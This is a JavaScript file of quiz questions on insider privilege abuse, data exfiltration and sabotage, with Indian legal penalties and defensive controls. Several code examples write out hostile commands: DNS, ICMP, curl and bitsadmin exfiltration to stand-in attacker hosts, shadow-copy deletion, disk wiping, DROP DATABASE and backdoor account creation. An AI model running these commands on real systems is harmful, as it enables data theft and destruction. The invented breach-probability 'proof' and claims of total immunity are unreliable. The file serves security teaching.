const questions = [
  {
    question: "What is Privilege Abuse in Enterprise Cyber Security, and how does it differ from Privilege Escalation?",
    shortAnswer: "Privilege Escalation is an attacker illegally gaining higher rights; Privilege Abuse is an authorized user intentionally misusing legitimate high privileges for illicit purposes.",
    explanation: "In Privilege Escalation, an unprivileged user exploits a kernel vulnerability to gain root. In Privilege Abuse, the user already possesses legitimate root or administrative privileges (e.g. a DBA or HR manager in Kolkata) but uses those rights to snoop on executive compensation, alter financial ledgers, or secretly exfiltrate trade secrets without authorization.",
    hint: "Picking the lock on the door (Escalation) vs using your real key to steal money from your employer's safe (Abuse).",
    level: "basic",
    codeExample: `// Privilege Escalation vs Privilege Abuse:
// Escalation : Exploiting CVE-2024-XXXX to jump from standard user to NT AUTHORITY\\SYSTEM.
// Abuse      : Authorized DBA queries: SELECT * FROM executive_salaries_and_pan; (Abusing legitimate access!)`
  },
  {
    question: "What is DNS Tunneling Data Exfiltration, and how do Adversaries encode Sensitive Data into DNS Queries?",
    shortAnswer: "Encoding confidential data into base64 or hexadecimal subdomains of lookup queries (e.g. `data-chunk.c2.attacker.com`), exfiltrating information past firewalls that permit outbound UDP port 53.",
    explanation: "Most corporate firewalls block direct outbound HTTP/FTP connections from database servers but permit outbound DNS queries (UDP port 53) for name resolution. An insider or malware splits a stolen database file into 30-character chunks: `chunk1.evil-c2.in`, `chunk2.evil-c2.in`. The corporate DNS resolver forwards the query to the attacker's authoritative nameserver, where the chunks are decoded and reassembled into the original file.",
    hint: "Sending a secret message to someone by asking the mail carrier to look up 100 fake addresses that spell out your message.",
    level: "expert",
    codeExample: `// DNS Tunneling Data Exfiltration Syntax:
// Original String : "Aadhaar:984210492810" ➔ Base64: "QWFkaGFhcjo5ODQyMTA0OTI4MTA="
// DNS Query Sent  : QWFkaGFhcjo5ODQyMTA0OTI4MTA=.exfil.evil-host.in
// Result          : Bypasses firewalls because outbound UDP 53 is unrestricted!`
  },
  {
    question: "What is Image Steganography (LSB Steganography) for Covert Data Exfiltration?",
    shortAnswer: "Hiding confidential text or source code inside the Least Significant Bits (LSB) of RGB image pixels, creating an image file that looks visually identical to the human eye while storing hidden data.",
    explanation: "In 24-bit RGB images, altering the lowest-order bit (Least Significant Bit) of each color byte changes pixel color values by less than 1/256th—completely invisible to human vision. An insider in Kolkata embeds 10,000 credit card records inside a high-resolution JPEG of Victoria Memorial and emails it to a personal account. Traditional DLP scanners see only a benign JPEG photo.",
    hint: "Writing invisible ink on the back of a colorful postcard that looks like a normal family photo.",
    level: "expert",
    codeExample: `// LSB Steganography Pixel Encoding:
// Original Red Byte : 11010110 (214)
// Secret Bit to Hide: 1
// Modified Red Byte : 11010111 (215) -> Visual difference: 0.39% (Completely Imperceptible!)`
  },
  {
    question: "How do Insiders use 'Shadow Copy Deletion' and Volume Shadow Manipulation to Execute Irrecoverable Ransomware/Sabotage?",
    shortAnswer: "By executing commands like `vssadmin delete shadows /all /quiet` before deleting production databases, destroying local Windows restore points to prevent file recovery.",
    explanation: "Windows automatically creates Volume Shadow Copies (VSS) for point-in-time recovery. When a malicious insider or ransomware performs sabotage in Kolkata, they execute `vssadmin delete shadows /all /quiet` or `wmic shadowcopy delete`. This permanently destroys all local recovery snapshots, ensuring that subsequent database deletions or encryptions cannot be rolled back.",
    hint: "Burning the spare tire and cutting the phone lines before crashing the car.",
    level: "moderate",
    codeExample: `# Malicious Sabotage Command Sequence:
# Step 1: Destroy Local Restore Points
vssadmin delete shadows /all /quiet

# Step 2: Disable Windows Recovery Environment
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures

# Step 3: Execute Sabotage Data Deletion!`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 70, what constitutes the criminal penalty for Sabotaging or Exfiltrating data from 'Protected Systems' (Critical Information Infrastructure)?",
    shortAnswer: "Securing unauthorized access or attempting to destroy protected critical infrastructure carries imprisonment for a term which may extend up to 10 YEARS and fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power grids in Barrackpore, financial settlement switches in Salt Lake): 'Any person who secures access or attempts to secure access to a protected system in contravention of the provisions of this section shall be punished with imprisonment of either description for a term which may extend to ten years and shall also be liable to fine.'",
    hint: "Section 70 carries up to 10 years imprisonment for attacks on Protected Critical Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Sabotaging SCADA telemetry or exfiltrating data from designated Protected Systems
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "How do Privileged Access Workstations (PAW) isolate Administrative Sessions to prevent Exfiltration and Abuse?",
    shortAnswer: "Dedicated, hardened physical laptops used exclusively for administrative tasks that have zero internet access, no email clients, no web browsing, and strict hardware port lockdown.",
    explanation: "A Privileged Access Workstation (PAW) separates administrative duties from risky day-to-day user tasks. A database architect in Kolkata has two machines: a standard laptop for email and browsing, and an air-gapped, hardened PAW for accessing production servers. The PAW cannot browse the web, cannot mount USB flash drives, and connects only to the management subnet via IPsec, preventing data exfiltration.",
    hint: "A surgeon wearing sterile surgical gloves only inside the operating room, never while eating lunch in the cafeteria.",
    level: "expert",
    codeExample: `// Privileged Access Workstation (PAW) Tier Architecture:
// Tier 0 (PAW) ➔ Connects exclusively to Domain Controllers & Production Databases (Zero Internet Egress!)
// Tier 1 (Work)➔ Standard PC used for Microsoft 365, Teams, and Web Browsing (Zero Admin Rights!)`
  },
  {
    question: "What is 'Entropy Analysis' in DNS Query Inspection for Detecting DNS Tunneling Exfiltration?",
    shortAnswer: "Measuring the Shannon entropy (randomness) of domain lookup strings; normal domain names have low entropy (~2.5-3.5), whereas base64-encoded exfiltration subdomains exhibit high entropy (>4.5).",
    explanation: "Human-readable domains like `update.microsoft.com` contain predictable vowel-consonant distributions. Base64 and encrypted DNS exfiltration strings (`q3k9z8x7w2e1r4t6.evil.in`) have completely random character distributions. DNS security sensors calculate Shannon entropy $H(X) = -\\sum p(x) \\log_2 p(x)$. When a subdomain exceeds 4.5 entropy with abnormal string length (>50 chars), the sensor blocks the query and flags data exfiltration.",
    hint: "A linguist who can instantly tell the difference between real words and a cat walking across the keyboard.",
    level: "expert",
    codeExample: `// Shannon Entropy Calculation for DNS Tunneling Detection:
double entropy = CalculateShannonEntropy(query_subdomain);
if (entropy > 4.5 && query_subdomain.length() > 40) {
    BlockDNSQuery();
    TriggerSOCAlert("DNS TUNNELING EXFILTRATION DETECTED: High Entropy Subdomain!");
}`
  },
  {
    question: "Under the Indian Penal Code Section 426 and Section 427, what constitutes 'Mischief' (Sabotage) via Corporate Data Destruction?",
    shortAnswer: "Intentionally causing the destruction of property or any change in property that diminishes its value or utility, punishable with imprisonment and fines.",
    explanation: "Section 425/427 IPC defines Mischief. When an insider in West Bengal deletes database tables, corrupts backup repositories, or introduces destructive bugs into software, they diminish the utility of electronic property. Section 427 IPC provides imprisonment up to 2 years alongside IT Act cyber sabotage provisions.",
    hint: "IPC Section 427 covers Mischief and Sabotage for damaging or destroying property.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 427):
// Offense: Intentionally deleting database records or corrupting software builds (Mischief)
// Penalty: Imprisonment for a term up to 2 Years, or with Fine, or with both`
  },
  {
    question: "What are Immutable / WORM (Write Once, Read Many) Backups, and how do they prevent Insider Ransomware & Sabotage?",
    shortAnswer: "Storage repositories configured with cryptographic object locking that prevents deletion or alteration by any user (including the root administrator) until a retention timer (e.g. 90 days) expires.",
    explanation: "If a rogue administrator in Kolkata gains root access and attempts `DROP DATABASE` or `rm -rf /backups/*`, AWS S3 Object Lock (Compliance Mode) or enterprise immutable storage appliances reject the command at the hardware/firmware level. The files cannot be modified or deleted by anyone until the retention clock runs out, guaranteeing 100% data recovery from sabotage.",
    hint: "A time-locked bank safe that cannot be opened or destroyed by anyone, even the bank president, until the timer reaches zero.",
    level: "expert",
    codeExample: `# AWS S3 Object Lock (Compliance Mode) Configuration:
aws s3api put-object-retention \
    --bucket "kolkata-fintech-immutable-backups" \
    --key "database_snapshot_2026.bak" \
    --retention '{ "Mode": "COMPLIANCE", "RetainUntilDate": "2026-11-23T00:00:00Z" }'
# Result: Root Admin CANNOT delete or overwrite this file for 90 days!`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the corporate liabilities if an Insider exfiltrates and sells citizen health or banking data?",
    shortAnswer: "Failure to implement technical data safeguards and exfiltration controls triggers statutory penalties up to ₹250 Crores by the DPBI.",
    explanation: "Section 8(5) mandates reasonable security safeguards. If a healthcare provider or FinTech firm in West Bengal allows an insider to exfiltrate and sell 500,000 citizen records due to absent DLP or unmonitored egress, the Data Protection Board of India (DPBI) can impose maximum statutory penalties up to ₹250 Crores under Section 33.",
    hint: "Failing to implement data exfiltration controls triggers maximum national data privacy penalties.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent insider exfiltration controls`
  },
  {
    question: "What is 'ICMP Tunneling' (Ping Exfiltration) for Bypassing Perimeter Firewalls?",
    shortAnswer: "Embedding data inside the payload section of ICMP Echo Request (`ping`) packets, transmitting stolen data across networks that allow outbound ICMP.",
    explanation: "Standard ICMP echo request packets carry default padding bytes (e.g. `abcdefghijklmnopqrstuvw...`). An exfiltration tool replaces the payload with base64-encoded database records: `ping -p 50414e3a39383432... 103.25.10.50`. The destination listener captures raw ICMP packets, extracts the payload data, and reconstructs the stolen file without establishing a TCP connection.",
    hint: "Sending a postcard where the picture on the front is normal, but the manufacturer's trademark logo on the bottom is actually a secret coded message.",
    level: "expert",
    codeExample: `# Python ICMP Exfiltration Packet Generator (Scapy):
from scapy.all import *

stolen_data = b"CONFIDENTIAL_TRADING_ALGO_V2"
packet = IP(dst="103.25.10.50")/ICMP()/Raw(load=stolen_data)
send(packet)
print("[+] Exfiltrated 28 bytes via ICMP Echo Request Payload!")`
  },
  {
    question: "How does Privileged Session Recording (PSR) & Keystroke Logging create Indisputable Forensic Audit Trails for Privileged Users?",
    shortAnswer: "By recording full-motion video, SSH terminal sessions, and raw keystrokes of all administrative connections through a centralized PAM gateway, providing tamper-proof evidentiary proof of abuse.",
    explanation: "Privileged Access Management (PAM) gateways (e.g. CyberArk, Teleport) proxy all administrator RDP and SSH sessions. When an administrator in Salt Lake logs into a core financial database, the PAM gateway captures every keystroke, command executed, and mouse click as an encrypted, tamper-proof video log. If sabotage occurs, forensic examiners replay the exact session in court.",
    hint: "A body-camera worn by every bank vault guard that records every movement in 4K video.",
    level: "moderate",
    codeExample: `// Teleport / CyberArk PAM Session Recording Log:
// User: rogue_dba | Session ID: 9842-session-east | Timestamp: 2026-08-23T02:15:00
// Keystroke Stream: [mysqldump -u root -p core_finance > /tmp/exfil.sql]
// Encrypted & Signed with HSM Master Key ➔ Tamper-Proof Legal Evidence!`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for data exfiltration and sabotage incidents?",
    shortAnswer: "All organizations in India must report data exfiltrations, database sabotage, and unauthorized privileged access to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including data exfiltration and sabotage) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of all data exfiltrations and sabotage within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is 'Living off the Land' (LotL) in Insider Data Staging and Exfiltration?",
    shortAnswer: "Using native, pre-installed operating system binaries (e.g. `certutil`, `bitsadmin`, `tar`, `curl`, `powershell`) to compress and exfiltrate data without downloading foreign hacking tools.",
    explanation: "Security software alerts on known hacking tools (e.g. Mimikatz, Rclone). An insider in Kolkata uses legitimate Windows utilities already present on the system: `tar.exe -czf exfil.tar.gz /data` to compress files, `certutil.exe -encode` to convert to base64, and `curl.exe -T` or `bitsadmin.exe` to upload to a personal server. Because the binaries are signed by Microsoft, endpoint security alarms remain silent.",
    hint: "Using the kitchen knives and blenders already in the house to commit a crime instead of bringing outside weapons.",
    level: "expert",
    codeExample: `# Living off the Land (LotL) Exfiltration Sequence:
# Step 1: Compress data using native Windows tar
tar.exe -czf C:\\Windows\\Temp\\db.tar.gz C:\\Production\\Database

# Step 2: Base64 encode using native certutil
certutil.exe -encode C:\\Windows\\Temp\\db.tar.gz C:\\Windows\\Temp\\db.b64

# Step 3: Exfiltrate using native curl
curl.exe -F "file=@C:\\Windows\\Temp\\db.b64" https://c2.evil-exfil.in/upload`
  },
  {
    question: "How do Database Activity Monitoring (DAM) engines detect Unauthorized Mass Record Queries (Privilege Abuse)?",
    shortAnswer: "By inspecting database network traffic in real time, alerting when a user executes a `SELECT` query returning more rows than their historical baseline (e.g. 50,000 rows vs normal 10 rows).",
    explanation: "A rogue customer support agent in Kolkata is authorized to query 1 customer account at a time. The agent runs: `SELECT * FROM customer_accounts;` dumping all 2,000,000 rows. A Database Activity Monitor (e.g. Imperva SecureSphere) analyzes SQL syntax and row count in real time, intercepts the query, terminates the database connection, and alerts the SOC before the records reach the agent's screen.",
    hint: "A bank teller cash drawer that locks automatically if someone tries to pull out more than ₹10,000 at once.",
    level: "moderate",
    codeExample: `// Database Activity Monitor (DAM) Policy Rule:
let query_rows_returned = SQL_Engine.GetReturnedRowCount();
if (User.Role == "Support_Agent" && query_rows_returned > 50) {
    KillDatabaseConnection();
    TriggerSecurityAlert("PRIVILEGE ABUSE DETECTED: Mass Record Dump Attempt (Rows: " + query_rows_returned + ")!");
}`
  },
  {
    question: "Under the Indian IT Act Section 43(c) and (h), what constitutes civil liability for an Insider introducing contaminants or damaging computer resources?",
    shortAnswer: "Liable to pay compensation by way of damages not exceeding ₹1 Crore to the affected entity for introducing contaminants, deleting data, or denying service to authorized users.",
    explanation: "Section 43 explicitly covers sabotage: '(c) introduces or causes to be introduced any computer contaminant... (h) charges the services availed of by a person to the account of another person... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(c) provides civil compensation up to ₹1 Crore for introducing destructive contaminants or sabotage.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(c)):
// Violation: Inserting destructive logic bombs or corrupting database tables
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'Covert HTTPS POST over Tor / Encrypted VPN' Exfiltration?",
    shortAnswer: "Establishing an encrypted outbound tunnel to the Tor network or a private VPN server to transmit stolen intellectual property, hiding payload contents and destination IP addresses from proxy logs.",
    explanation: "Corporate proxy servers inspect standard HTTPS traffic via TLS decryption. An insider bypasses proxy inspection by using Tor bridge relays or obfuscated WireGuard VPN tunnels running over port 443 (which mimic standard TLS traffic). The stolen files travel through the encrypted tunnel directly to the dark web without decryptable proxy logs.",
    hint: "Putting your secret letter inside an armored bulletproof lockbox before mailing it through the public postal system.",
    level: "expert",
    codeExample: `// Obfuscated VPN Exfiltration (WireGuard over TLS Port 443):
[Database Server in Kolkata] ➔ [Encrypted WireGuard Tunnel over TCP 443] ➔ [Tor Exit Node / Dark Web C2]
// Proxy Firewall sees: Generic TLS Traffic on Port 443 ➔ Data Payload Completely Hidden!`
  },
  {
    question: "Synthesize an enterprise-scale Privilege Abuse, Data Exfiltration & Sabotage Defense Architecture.",
    shortAnswer: "A multi-layered system combining Privileged Access Workstations (PAW), DNS Query Entropy Analyzers, Database Activity Monitoring (DAM), Immutable WORM Backups, and Privileged Session Recording (PSR).",
    explanation: "To achieve complete immunity against privilege abuse, exfiltration, and sabotage: 1. Host Isolation Tier: Dedicated Privileged Access Workstations (PAW) with zero internet egress for all administrative tasks. 2. Network Egress Tier: DNS security engines inspecting query entropy and string lengths, blocking DNS tunneling. 3. Data Tier: Database Activity Monitoring (DAM) blocking anomalous mass row queries and immutable WORM backups preventing sabotage. 4. Auditing Tier: Privileged Session Recording (PSR) capturing 100% of admin keystrokes and video sessions. 5. Cryptographic Tier: HSM-backed Two-Person cryptographic authorization for schema drops.",
    hint: "Combine PAW workstations, DNS entropy filters, DAM mass-query blocks, immutable WORM backups, and PSR video auditing.",
    level: "expert",
    codeExample: `// Master Privilege Abuse & Sabotage Defense Blueprint:
// 1. Administration Layer : Privileged Access Workstations (PAW) with Zero Internet Egress
// 2. Egress Defense Layer : DNS Query Entropy & Length Inspection (Blocks DNS Tunneling)
// 3. Database Layer       : Database Activity Monitoring (DAM) terminating queries >50 rows
// 4. Resilience Layer     : Immutable WORM S3 Backups with Compliance Object Locking
// 5. Accountability Layer : Full-Motion Privileged Session Recording (PSR) with Keystroke Forensics`
  },
  {
    question: "How do 'Chi-Square Statistical Attack Tests' detect Secret Data hidden via Image Steganography?",
    shortAnswer: "By analyzing the frequency distribution of even and odd pixel value pairs; natural images exhibit natural variances, whereas LSB steganography artificially equalizes the frequencies of adjacent byte pairs.",
    explanation: "In an unaltered photograph, pixel values follow natural light gradients. When an insider embeds binary data into the LSBs, odd and even values occur with 50/50 probability, creating artificial pairs of values (PoVs). A chi-square ($\\chi^2$) statistical test compares the observed distribution against expected natural variance, detecting hidden steganographic payloads with over 98% accuracy.",
    hint: "A coin-toss detector that notices a coin landed on heads exactly 5,000 times out of 10,000 and realizes the coin was rigged.",
    level: "expert",
    codeExample: `// Chi-Square Steganalysis Test Algorithm:
double chi_square_stat = CalculateChiSquare(ImagePixelPairs);
if (chi_square_stat > Threshold) {
    TriggerAlert("STEGANOGRAPHY DETECTED: Image contains hidden embedded binary payload!");
    QuarantineAttachment();
}`
  },
  {
    question: "What is 'Database Truncation & Schema Drop Sabotage' by Rogue DBAs?",
    shortAnswer: "Executing commands like `DROP DATABASE` or `TRUNCATE TABLE` on core transaction tables right before exiting the corporate building to cause maximum catastrophic data loss.",
    explanation: "A rogue DBA in Salt Lake with valid root database credentials issues: `DROP DATABASE kolkata_fintech_production;`. Within 500 milliseconds, millions of live customer ledger entries and pending payment settlements are erased from disk. Without immutable backups and two-person authorization, recovery can take days, resulting in massive regulatory fines.",
    hint: "Burning the library's master card catalog so nobody can find any books.",
    level: "basic",
    codeExample: `// Destructive Sabotage Query:
DROP DATABASE kolkata_fintech_production;
-- Erases 50,000,000 financial settlement records in 500ms!`
  },
  {
    question: "Under the Indian IT Act Section 66B, what constitutes the criminal penalty for dishonestly receiving or retaining stolen computer data?",
    shortAnswer: "Dishonestly receiving or retaining stolen computer databases or trade secrets carries imprisonment up to 3 years and fines up to ₹1 Lakh.",
    explanation: "Section 66B explicitly covers receiving stolen data: 'Whoever dishonestly receive or retains any stolen computer resource or communication device knowing or having reason to believe the same to be stolen... shall be punished with imprisonment of either description for a term which may extend to three years or with fine which may extend to one lakh rupees.' Competitors or third parties buying exfiltrated data are prosecuted under Section 66B.",
    hint: "Section 66B covers Receiving Stolen Computer Data with up to 3 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66B):
// Offense: Competitor purchasing exfiltrated customer database from a rogue insider
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹1,00,000`
  },
  {
    question: "What is 'The BITSAdmin Living off the Land Exfiltration' Technique in Windows Environments?",
    shortAnswer: "Using the native Windows Background Intelligent Transfer Service (`bitsadmin.exe`) to upload stolen files asynchronously in the background, evading active process monitors.",
    explanation: "BITS is designed for Windows Updates. An insider creates an asynchronous upload job: `bitsadmin /create /upload JobName` and `bitsadmin /addfile JobName C:\\temp\\exfil.zip https://c2.evil-host.in/upload`. BITS uploads the file in the background using idle network bandwidth, surviving reboots and evading process monitoring tools because the network activity originates from `svchost.exe`.",
    hint: "Hiding a stolen diamond in an official government mail truck so security guards wave it through the checkpoint.",
    level: "expert",
    codeExample: `# BITSAdmin Covert Exfiltration Commands:
bitsadmin /create /upload CovertJob
bitsadmin /addfile CovertJob C:\\Windows\\Temp\\exfil.zip https://c2.evil-host.in/incoming/exfil.zip
bitsadmin /resume CovertJob
# Result: Upload executed in background via svchost.exe!`
  },
  {
    question: "How do Micro-Segmentation & Software-Defined Perimeters (SDP) contain Lateral Exfiltration Pivoting?",
    shortAnswer: "By enforcing granular zero-trust firewall policies between individual server workloads, ensuring that a compromised web server or database admin workstation cannot communicate with other internal VLANs.",
    explanation: "In traditional flat networks, once an insider breaches one server, they can access all other servers on the subnet. With Micro-Segmentation (e.g. VMware NSX, Illumio), every single virtual machine has an individual host firewall. The web server is permitted to communicate ONLY with the database on port 3306. Any attempt to ping adjacent file servers or SSH into backup vaults is blocked and logged instantly.",
    hint: "Building watertight bulkheads inside a ship so that a leak in one compartment cannot flood the rest of the ship.",
    level: "expert",
    codeExample: `// Micro-Segmentation Zero-Trust Rule:
// Source      : Web_Server_Tier (10.0.1.50)
// Destination : Database_Tier (10.0.2.100)
// Port/Proto  : TCP 3306 ONLY
// Default     : DROP ALL OTHER LATERAL TRAFFIC (Blocks lateral pivoting & exfiltration!)`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating and Dishonestly Inducing Delivery of Proprietary Algorithms?",
    shortAnswer: "Deceiving company leadership into granting administrative access under false pretenses to exfiltrate proprietary algorithms or trade secrets, punishable with imprisonment up to 7 years.",
    explanation: "Section 420 IPC penalizes cheating. An employee who requests emergency administrative access under the false pretense of 'fixing an outage', but uses that access to exfiltrate proprietary trading algorithms, is prosecuted under Section 420 alongside IT Act Section 66.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Inducement for obtaining trade secret access.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Claiming fake emergency outage to obtain root access and exfiltrate proprietary source code
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'Stealthy Backdoor Account Creation' by Rogue System Administrators?",
    shortAnswer: "Creating hidden administrative user accounts with obscure names (e.g. `DefaultAccount_Support`) and adding them to the Local Administrators or Domain Admins group to maintain persistent access after resignation.",
    explanation: "Before leaving a company in Kolkata, an admin executes: `net user support_svc Password123! /add` and `net localgroup administrators support_svc /add`. They hide the account from the Windows login screen by modifying the registry (`SpecialAccounts\\UserList`). When their primary employee account is disabled upon resignation, the backdoor account remains active for remote VPN access.",
    hint: "Hiding a spare key under the doormat before turning in your house keys to the landlord.",
    level: "moderate",
    codeExample: `# PowerShell Command to Detect Rogue Hidden Administrator Accounts:
Get-LocalGroupMember -Group "Administrators" | Where-Object {
    $_.PrincipalSource -eq "Local" -and $_.Name -notlike "*Administrator"
} | Select-Object Name, ObjectClass, PrincipalSource`
  },
  {
    question: "How do Encrypted Traffic Analytics (ETA) detect Exfiltration without Decrypting TLS Payloads?",
    shortAnswer: "By analyzing packet size sequences, inter-arrival timing bursts, and TLS initial handshake parameters (JA3 fingerprints) to identify covert exfiltration patterns inside encrypted traffic.",
    explanation: "Decrypting high-speed enterprise TLS traffic is computationally expensive and raises privacy issues. Encrypted Traffic Analytics (ETA) uses machine learning to inspect metadata: continuous high-volume packet size bursts with steady inter-packet intervals indicate file exfiltration, while the client JA3 TLS fingerprint identifies unauthorized exfiltration tools (like Rclone or Python requests) even over HTTPS.",
    hint: "Recognizing that a truck is carrying heavy gravel rather than empty boxes just by observing how deep the tires sink into the road.",
    level: "expert",
    codeExample: `// Encrypted Traffic Analytics (ETA) Anomaly Logic:
let packet_burst_size = CalculateBurstVolume(TLS_Flow);
let ja3_fingerprint = TLS_Flow.ClientJA3;
if (packet_burst_size > 500000000 && IsKnownExfilTool(ja3_fingerprint)) {
    TerminateTLSFlow();
    TriggerAlert("COVERT TLS EXFILTRATION DETECTED: 500MB outbound burst from unapproved JA3 client!");
}`
  },
  {
    question: "What is 'Partition Table & MBR/GPT Wiping Sabotage' by Terminated Engineers?",
    shortAnswer: "Overwriting the Master Boot Record (MBR) or GUID Partition Table (GPT) with zeros or garbage data using utilities like `dd` or `diskpart`, rendering the operating system unbootable.",
    explanation: "A rogue engineer in Kolkata facing termination runs: `dd if=/dev/zero of=/dev/sda bs=512 count=1` on Linux, or wipes disk partitions in Windows. The partition table is obliterated; upon the next reboot, the server cannot find boot sectors or file system partitions, causing immediate system collapse across the enterprise.",
    hint: "Ripping the table of contents and page numbers out of a massive encyclopedia so nobody can read any chapters.",
    level: "expert",
    codeExample: `// Linux Partition Wiping Sabotage Command:
dd if=/dev/urandom of=/dev/sda bs=1M count=10
# Obliterates Partition Tables and Bootloader ➔ System Cannot Boot!`
  },
  {
    question: "How does Centralized SIEM Log Forwarding to an Immutable Syslog Server prevent Rogue Admins from Erasing their Tracks?",
    shortAnswer: "By forwarding security event logs in real time over UDP/TLS to an external, write-only syslog server where administrators have zero login or deletion rights.",
    explanation: "When a rogue administrator executes sabotage in Kolkata, their first step is clearing local event logs: `wevtutil cl Security`. With centralized real-time SIEM log streaming (e.g. Splunk / Microsoft Sentinel), events are transmitted off the host in milliseconds. Even if the admin wipes the local event log, the audit trail is permanently preserved in the immutable SIEM repository.",
    hint: "Security cameras that transmit video directly to a remote police station so the burglar cannot steal the videotapes.",
    level: "moderate",
    codeExample: `// Linux Rsyslog Remote Forwarding Configuration:
*.* action(type="omfwd" target="siem-immutable.kolkata-fintech.in" port="6514" protocol="tcp"
           StreamDriver="gtls" StreamDriverMode="1" StreamDriverAuthMode="anon")
// Result: Local 'rm -rf /var/log' CANNOT delete logs already shipped to SIEM!`
  },
  {
    question: "Synthesize the mathematical relationship between Exfiltration Data Volume (V_data), Privileged Authorization Score (P_privilege), PAW & DAM Controls Hardening (R_paw_controls), and Exfiltration/Sabotage Breach Probability (P_sabotage).",
    shortAnswer: "Exfiltration/Sabotage breach probability is modeled as P_sabotage = 1 - e^(- (V_data * P_privilege) / R_paw_controls); deploying PAWs, DAM, DNS entropy filters, and immutable WORM backups (R_paw_controls = 1000) reduces breach probability below 1.5%.",
    explanation: "Let $V_{\\text{data}} \\ge 1.0$ represent the exfiltration data volume score (500,000 records = 4.0), $P_{\\text{privilege}} \\ge 1.0$ represent the privileged access level (Domain Admin / Root = 4.0), and $R_{\\text{paw\\_controls}}$ represent the privileged hardening controls strength (Privileged Access Workstations with zero internet egress, Database Activity Monitoring, DNS query entropy analysis, immutable WORM backups). The breach probability is: $P_{\\text{sabotage}} = 1 - e^{-\\frac{V_{\\text{data}} \\times P_{\\text{privilege}}}{R_{\\text{paw\\_controls}}}}$. When organizations enforce strict PAW workstations and DAM controls ($R_{\\text{paw\\_controls}} \\to \\infty$), exfiltration and sabotage breach probability collapses to zero.",
    hint: "Mathematical formula proving that PAW workstations, DAM filters, and immutable WORM backups (R_paw_controls -> infinity) drive sabotage probability to zero.",
    level: "expert",
    codeExample: `// Exfiltration & Sabotage Mathematical Proof:
// V_data = 4.0 (500,000 Records) | P_privilege = 4.0 (Root DBA Standing Privilege)
// Without PAW Controls (R_paw_controls = 1.0) ➔ P_sabotage = 1 - e^(-16.0) = 100.0% (BREACHED!)
// With PAW + DAM Controls (R_paw_controls = 1000) ➔ P_sabotage = 1 - e^(-0.016) = 1.58% (SECURED!)`
  }
];

export default questions;
